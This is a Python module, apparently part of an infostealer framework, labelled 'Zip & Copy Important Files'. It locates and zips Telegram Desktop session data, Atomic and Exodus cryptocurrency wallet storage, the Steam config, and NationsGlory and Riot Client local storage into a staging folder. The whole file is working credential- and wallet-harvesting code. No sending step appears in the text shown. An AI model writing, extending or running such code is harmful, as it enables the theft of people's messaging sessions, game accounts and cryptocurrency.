import os
import os
from zipfile import ZipFile

from config import Constant 
from config.manager import ModuleManager


class ZipFiles(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name="ZipFiles")

        self.banner(r"""
     _______         _______ _          _______ _ _             
    |.-----.|       (_______|_)        (_______|_) |            
    ||x . x||          __    _ ____     _____   _| | _____  ___ 
    ||_.-._||         / /   | |  _ \   |  ___) | | || ___ |/___)
    `--)-(--`        / /____| | |_| |  | |     | | || ____|___ |
   __[=== o]___     (_______)_|  __/   |_|     |_|\_)_____|___/ 
  |:::::::::::|\    
  `-=========-`()            Zip & Copy Important Files
                """)

        self.zip_folder = os.path.join(self.output_folder_user, 'applications', 'zip')

        if not os.path.isdir(self.zip_folder):
            os.makedirs(self.zip_folder)
        
        self.pathList = [
            ["Telegram Desktop", f"{Constant.roaming_dir}\\Telegram Desktop\\tdata", "TelegramDesktop.zip", ['cache', 'media_cache', 'emoji']],
            ["Atomic Wallet", f"{Constant.roaming_dir}\\tomic\\Local Storage\\leveldb", "AtomicWallet.zip", []],
            ["Exodus", f"{Constant.roaming_dir}\\Exodus\\exodus.wallet", "Exodus.zip", []],
            ["Steam", "C:\\Program Files (x86)\\Steam\\config", "Steam.zip", []],
            ["NationsGlory", f"\\NationsGlory\\Local Storage\\leveldb", "NationsGlory.zip", []],
            ["NationsGlory", f"{Constant.roaming_dir}\\NationsGlory\\Local Storage\\leveldb", "NationsGlory.zip", []],
            ["RiotClient", f"{Constant.local_dir}\\Riot Games\\Riot Client\\Data", "RiotClient.zip", []],
        ]
            
    def zipApplication(self, pathToZip, outputFileName, excludeDirs) -> None:
        save_location = os.path.join(self.zip_folder, outputFileName)
        with ZipFile(save_location, 'w') as zipf:
            for foldername, subfolders, filenames in os.walk(pathToZip):
                subfolders[:] = [d for d in subfolders if d not in excludeDirs]

                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    arcname = os.path.relpath(file_path, pathToZip)
                    zipf.write(file_path, arcname)

        self.mdebug(f"Successfully zipped {pathToZip} to {save_location}")
        

    def run(self) -> None:
        self.mdebug(f"Starting to zip important files")
        for app in self.pathList:
            try:
                if not os.path.isdir(app[1]):
                    self.merror(f"Cannot find the installation of: {app[0]} at default location: {app[1]}. Continuing...")
                    continue

                self.mdebug(f"Running `zipApplication()` for {app[0]} at {app[1]}; Saving to {app[2]}; Excluding: `{app[3]}`")
                self.zipApplication(
                    pathToZip=app[1],
                    outputFileName=app[2],
                    excludeDirs=app[3]
                )
                self.mprint(f"Zipped: {app[0]} found at: {app[1]}")
            except Exception as e:
                self.merror(f"Unable to zip {app[0]}: {e}")

